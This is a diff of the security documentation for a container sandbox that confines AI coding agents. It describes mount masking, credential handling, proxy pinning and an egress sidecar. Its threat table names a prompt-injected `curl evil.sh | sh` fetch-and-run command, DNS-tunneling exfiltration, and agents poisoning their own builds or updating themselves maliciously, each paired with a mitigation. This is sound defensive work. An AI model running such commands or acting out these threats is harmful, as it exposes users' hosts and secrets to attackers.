@@ -1,4 +1,4 @@
-# Security Model
+# Security model
 
 Executable regression checks and adversarial probes are mapped in
 [Security verification](security-verification.md). A passing ordinary unit run
@@ -33,7 +33,7 @@ Dry-runs do not perform these mutations.
 
 These protections prevent redirected host writes. Separately, CLI invocations
 hold a context lock from rendering through image selection and pin the image
-selected for launch. See [concurrent builds](concurrent-builds.md) for cache
+selected for launch. See [Concurrent sessions](runtime.md#concurrent-sessions) for cache
 identity checks, serialization, and the external-builder boundary.
 
 ## Implicit history and mask mounts
@@ -59,7 +59,7 @@ another mounted source. Explicit mounts of the storage tree, its ancestors, or
 its descendants are refused, even when read-only. Only fully understood bind
 mount options are accepted here; known bind propagation, recursion, and consistency
 options retain their runtime semantics while their sources are checked. Ambiguous
-and unmodeled passthrough forms fail closed. See [mount validation](egress-sidecar.md#extra-mount-validation). A fresh CLI mask belongs to one session and is removed on normal or
+and unmodeled passthrough forms fail closed (see [extra mounts](usage.md#quick-start)). A fresh CLI mask belongs to one session and is removed on normal or
 exceptional teardown without deleting other sessions' masks or history.
 
 Generated devcontainers retain a private empty mask and run a standalone helper
@@ -209,9 +209,8 @@ for as long as possible and make any shortfall visible:
   afterward. Sessions are not killed at the deadline. For OpenCode, the
   soonest-expiring OAuth provider in its `auth.json` is used; long-lived/API-key
   providers carry no host-logout risk and show no warning. Pi's `auth.json`
-  shape is not yet parsed by this check (deferred; see `TODO.md`), so no
-  expiry warning is shown for Pi and the in-container agent's own refresh
-  behavior applies.
+  shape is not parsed by this check, so no expiry warning is shown for Pi and
+  the in-container agent's own refresh behavior applies.
 - `--no-forward-credentials` starts the container unauthenticated. Host
   credentials are not read, staged, or mounted; other sessions' and persistent
   devcontainer inputs are preserved, and the generated
@@ -233,15 +232,16 @@ container" guidance.
 
 ## Generated build inputs
 
-Generated Cargo builds quote shell paths, terminate command options, and encode
-literal manifest copies as JSON arrays with Docker variable and wildcard
-escaping. Member paths and manifests must remain inside the project after
-symlink resolution. Control characters, parent traversal, absolute paths, and
-backslashes are rejected. Generated `FROM` values accept literal image tokens
-and toolchain tag values only. See [generated Rust builds](cargo-builds.md).
-Project build scripts and user-supplied Dockerfiles still execute as trusted
-build inputs; these checks prevent filename/instruction injection, not arbitrary
-code deliberately supplied by those inputs.
+Generated Cargo builds use workspace member paths literally: shell paths are
+quoted with option terminators, and `COPY` instructions are JSON arrays with
+Docker variable and wildcard escaping. Member globs are expanded on the host.
+Absolute paths, parent traversal, control characters, Unicode line separators
+and backslashes are rejected, and members and their manifests must resolve
+inside the project (also during `--dry-run`). The positional base image must be
+a literal image reference, and `--python`/`--rust` values must form a valid tag;
+whitespace, new instructions, variables and shell syntax are rejected. These
+checks prevent filename and instruction injection; project build scripts and
+user-supplied Dockerfiles still run as trusted build inputs.
 
 ## VCS metadata access
 
@@ -341,7 +341,7 @@ the container and:
   fallback port or wildcard address. Its state is private to the user
   (`$XDG_STATE_HOME/project-sandbox/local-forward/`, directories `0700`, files
   `0600`, symlinks refused). Apple `container` requires the administrator-managed
-  `host.docker.internal` localhost DNS mapping described in `docs/usage.md`.
+  `host.docker.internal` localhost DNS mapping described in [Apple container host alias](apple-container-dns.md).
   Creating it can disrupt container Internet access until runtime networking is
   rebuilt and might disable Private Relay, so restart the container system
   immediately afterward.
@@ -365,7 +365,7 @@ Customize:
   debugging.
 - `--pi-ollama` (with `--agent pi`) allows the host's Ollama port through the
   selected runtime-private endpoint and bakes Pi's provider config to use it;
-  see `docs/usage.md` for the runtime matrix and Apple setup. `--ollama-model` overrides the
+  see [runtime](runtime.md#end-to-end-flow) for forwarding per runtime. `--ollama-model` overrides the
   default model list.
 
 ## Node.js + npm images (`--node-npm`)
@@ -415,8 +415,8 @@ Customize:
 | DNS tunneling exfiltration | Allowlisted domains are pre-resolved at startup and general outbound DNS is blocked afterward. |
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
 | Malicious npm post-install scripts | Run as the unprivileged `agent` user (host-matched for Docker/Podman on Linux); no access to unmounted host paths. |
-| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `check_for_update_on_startup = false` for Codex; `PI_SKIP_VERSION_CHECK=1` for Pi. OpenCode config is not currently sanitized; see `TODO.md`. |
-| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex; `PI_OFFLINE=1` for Pi (disables startup update/telemetry network calls); `OPENSPEC_TELEMETRY=0` for OpenSpec. OpenCode config is not currently filtered for telemetry settings; see `TODO.md`. |
+| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `check_for_update_on_startup = false` for Codex; `PI_SKIP_VERSION_CHECK=1` for Pi. OpenCode config is not sanitized. |
+| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex; `PI_OFFLINE=1` for Pi (disables startup update/telemetry network calls); `OPENSPEC_TELEMETRY=0` for OpenSpec. OpenCode config is not filtered for telemetry settings. |
 | API token leakage via process environment | Default forwarded agent tokens are passed through mounted credential files, not environment variables; CLI staging files are kept in private per-session storage. Explicit `--api-key-env*` injection is opt-in, requires `--no-forward-credentials`, and redacts dry-run output, but the selected keys are still present in the runtime process environment during real runs. |
 | Agent rewrites the project `--dockerfile` to poison the next build | The project Dockerfile's SHA256 is recorded under the masked `.project-sandbox/.dockerfile-checksums.json`, which the sandbox cannot read or modify; a later run warns when the Dockerfile changed since it was last built. |
 | Agent reads or edits `.devcontainer` host-path mounts and config | `/workspace/.devcontainer` is masked with an empty read-only mount in both direct runs and devcontainers. |
@@ -487,27 +487,12 @@ The tool does not protect against:
 - The generated `.devcontainer/` targets local Docker-compatible runtimes such as
   Docker Desktop or OrbStack; remote services may require rewriting local mounts
   and relaxing or replacing firewall capability requirements.
-- `--branch` creates an isolated workspace for the agent. In git repos it creates
-  (or reuses) a git worktree on the given branch, mounts the worktree at
-  `/workspace`, and bind-mounts the main repo's `.git/` so `git` works correctly
-  inside the container. In jj repos it creates (or reuses) a jj workspace plus
-  bookmark, mounts that workspace at `/workspace`, and bind-mounts the main repo's
-  `.jj/` metadata so `jj` works inside the container. Worktree-of-worktree setups
-  are not supported.
-- After the session there is a single, non-integrating action: the agent's work
-  is captured on the branch/bookmark (any uncommitted changes are committed for
-  git; the working copy is snapshotted and the bookmark advanced to the session
-  tip for jj), and the worktree/workspace is removed. Nothing is ever merged, rebased, or
-  pushed into the main checkout — the branch/bookmark holds the work for you to
-  integrate manually. `--keep-workspace` leaves the worktree/workspace in place so
-  a later `--branch <same>` run reuses it; a failed session is also left in place
-  for inspection.
-- `--branch-start-at <revision>` pins the starting commit/tag/branch/bookmark for
-  a **new** branch created by `--branch`. It errors if the branch/bookmark already
-  exists (delete or merge it first, or omit the flag to reuse the existing one).
-- `jj` is installed in the container and configured with the same global
-  name/email identity passed to Git.
-# Agent gateway boundary
+- `--branch` sessions mount the main repository's `.git` or `.jj` metadata (see
+  [Branch sessions](usage.md#branch-sessions) and [VCS access](vcs-access.md));
+  worktree-of-worktree setups are not supported. `jj` in the container uses the
+  same global identity as Git.
+
+## Agent gateway boundary
 
 Proxy mode provides provider-credential isolation, not immunity from local
 spend. OpenAI/Anthropic keys and host OAuth state are excluded, but the agent
@@ -535,27 +520,16 @@ inspection, and pruning guidance before using sensitive material.
 
 ## Remote proxy endpoints
 
-Agent and Internet proxies can independently use HTTP loopback forwarding or
-direct remote HTTP/HTTPS. Internet mode retains default-deny IPv4/IPv6 and
-blocks general DNS, direct provider access, and broad gateway exceptions. Each
-endpoint is resolved with sandbox-visible DNS before closure, validated, and
-pinned for the session with exact TCP address/port permissions. Restart after
-DNS rotation. A hostname resolving to loopback, multicast, or an unspecified
-address aborts startup. IPv6 enforcement failures abort Internet mode.
-
-An IP/port exception also permits another virtual host on that pair; it is not
-an HTTP hostname policy. Verified TLS authenticates names for compliant clients.
-Proxy environment variables supply routing hints; removing them does not widen
-the firewall. Gateway and Ollama requests bypass the Internet proxy and keep
-independent permissions. Agent-only `--no-firewall` provides neither pinning nor
-egress enforcement. Operators must provide sandbox reachability to endpoints.
-
-Supplied public CAs extend per-connection host trust and rebuilt image-wide
-trust. They never change the host trust store. HTTPS gateway discovery ignores
-ambient proxies and follows no redirects, keeping the bearer key on the configured
-origin. Internet proxy authentication and client certificates are unsupported;
-HTTP 407 does not trigger credential acquisition or direct fallback. See
-[proxy endpoints](proxy-endpoints.md) for TLS scope and client limitations.
+`--agent-proxy` and `--internet-proxy` endpoints are pinned per session: each is
+resolved inside the sandbox before DNS is closed, and the firewall admits only
+its exact address/port pairs. That is an IP policy, not a hostname policy:
+other virtual hosts on the same pair are reachable. Internet mode keeps
+default-deny IPv4/IPv6, blocks DNS and direct provider access, and aborts when
+it can't enforce IPv6 denial. Proxy variables are routing hints; removing them
+doesn't widen the firewall. Supplied CAs extend per-connection host trust and,
+after a rebuild, image-wide trust, never the host's store. Gateway discovery
+ignores ambient proxies and follows no redirects, so the bearer key stays on
+the configured origin. Details: [Network access](networking.md#endpoint-rules).
 
 ## Egress sidecar
 
@@ -625,25 +599,16 @@ parts that matter for security:
   host, and non-TLS tunnels. In direct mode it also refuses names that resolve
   to private, loopback, link-local or metadata addresses. These denials happen
   before any upstream connection is made.
-- **Sidecar CA.** The sidecar owns one CA per runtime: EC P-256, `pathlen:0`,
-  with critical name constraints, valid for `[egress.ca] lifetime_days`
-  (default 7 days, at most 30).
-  - The constraint is `github.com` when the Copilot profile intercepts
-    `api.github.com`. It cannot be narrower, because Squid mimics GitHub's
-    `*.github.com` certificate names.
-  - Otherwise the constraint is the reserved name `invalid`, and the CA is not
-    mounted into any sandbox.
-  - The key lives in `egress/<runtime>/sidecar/ca-key.pem`, mode 0600 in a
-    0700 directory, written with `O_EXCL | O_NOFOLLOW`. It is mounted read-only
-    into the sidecar only, never into a sandbox, and deleted by
-    `project-sandbox-egress down` or when the CA is replaced. It lives as long
-    as the sidecar keeps it, at most 30 days.
-  - The CA is reused across restarts while it has at least 2 days left and its
-    constraints match. While interception is active, launches warn within 2
-    days of expiry and refuse to start once it has expired.
-  - Only the public certificate enters a sandbox, through the read-only
-    per-session mount `/project-sandbox-egress`, and it is installed at
-    start-up, never baked into an image.
+- **Sidecar CA.** One CA per runtime (EC P-256, `pathlen:0`, critical name
+  constraints, at most 30 days). It is constrained to `github.com` when the
+  Copilot profile intercepts `api.github.com` (Squid mimics `*.github.com`, so
+  it can't be narrower) and to the reserved name `invalid` otherwise, in which
+  case it isn't mounted into sandboxes at all. The private key (0600 in a 0700
+  directory, written with `O_EXCL | O_NOFOLLOW`) is mounted into the sidecar
+  only and deleted by `project-sandbox-egress down`. Only the public
+  certificate reaches a sandbox, through a read-only per-session mount, and is
+  never baked into an image. Launches refuse to start once an intercepting CA
+  has expired. See [The sidecar CA](egress-sidecar.md#the-sidecar-ca).
 - **GitHub.** Repository hosts cannot be allowlisted in this mode. The Copilot
   profile admits only `/copilot_internal/` on `api.github.com`. Copilot CLI
   telemetry and its update check are blocked.
